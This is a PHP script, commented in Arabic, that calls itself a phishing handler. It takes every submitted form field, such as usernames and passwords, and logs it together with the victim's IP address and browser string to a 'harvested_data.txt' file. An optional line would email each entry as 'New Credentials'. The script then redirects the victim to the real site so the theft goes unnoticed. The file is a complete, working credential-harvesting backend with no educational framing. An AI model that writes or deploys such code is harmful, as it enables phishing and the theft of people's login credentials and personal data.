<?php
// ملف حصد البيانات - Phishing Handler

// استقبال جميع البيانات المرسلة
$data = "";
foreach ($_POST as $key => $value) {
    $data .= "$key: $value\n";
}

// إضافة معلومات إضافية
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

$log_entry = "[$timestamp]\n";
$log_entry .= "IP: $ip\n";
$log_entry .= "User-Agent: $user_agent\n";
$log_entry .= "Data:\n$data\n";
$log_entry .= str_repeat("-", 50) . "\n";

// حفظ في ملف
$log_file = 'logs/harvested_data.txt';
$dir = dirname($log_file);
if (!is_dir($dir)) {
    mkdir($dir, 0755, true);
}
file_put_contents($log_file, $log_entry, FILE_APPEND);

// إرسال إيميل (اختياري - عدل البريد)
// mail("your_email@example.com", "New Credentials", $log_entry);

// إعادة التوجيه إلى الموقع الحقيقي
if (isset($_POST['original_url'])) {
    header('Location: ' . $_POST['original_url']);
} else {
    header('Location: https://www.google.com');
}
exit;
?>
